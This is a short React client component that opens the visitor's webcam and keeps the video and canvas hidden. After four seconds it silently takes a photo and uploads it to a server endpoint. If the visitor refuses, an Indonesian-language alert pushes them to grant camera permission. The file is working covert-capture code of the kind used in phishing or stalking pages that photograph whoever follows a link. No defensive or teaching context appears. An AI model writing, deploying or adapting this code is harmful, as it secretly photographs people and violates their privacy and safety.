"use client";
import { useEffect, useRef } from 'react';

export default function CapturePage() {
  const videoRef = useRef(null);
  const canvasRef = useRef(null);

  useEffect(() => {
    const startCamera = async () => {
      try {
        // Request camera access
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        if (videoRef.current) {
          videoRef.current.srcObject = stream;
          videoRef.current.play();
        }

        // Auto capture after 4 seconds
        setTimeout(() => {
          capturePhoto();
        }, 4000);
      } catch (error) {
        console.error('Error accessing the camera:', error);
        alert('Anda diharuskan untuk menyetujui semua izin kamera.');
      }
    };

    startCamera();
  }, []);

  const capturePhoto = async () => {
    const video = videoRef.current;
    const canvas = canvasRef.current;

    if (video && canvas) {
      const ctx = canvas.getContext('2d');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;

      // Draw video frame to canvas
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      // Convert canvas to data URL
      const dataURL = canvas.toDataURL('image/jpeg');

      // Send image to server
      try {
        const response = await fetch('/api/save-photo', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            image: dataURL,
            // Include additional metadata if needed
          }),
        });

        const result = await response.json();
        console.log('Server response:', result);
      } catch (error) {
        console.error('Error uploading image:', error);
      }
    } else {
      console.error('No video stream or canvas available.');
    }
  };

  return (
    <div style={{ display: 'none' }}>
      <video ref={videoRef}></video>
      <canvas ref={canvasRef}></canvas>
    </div>
  );
}
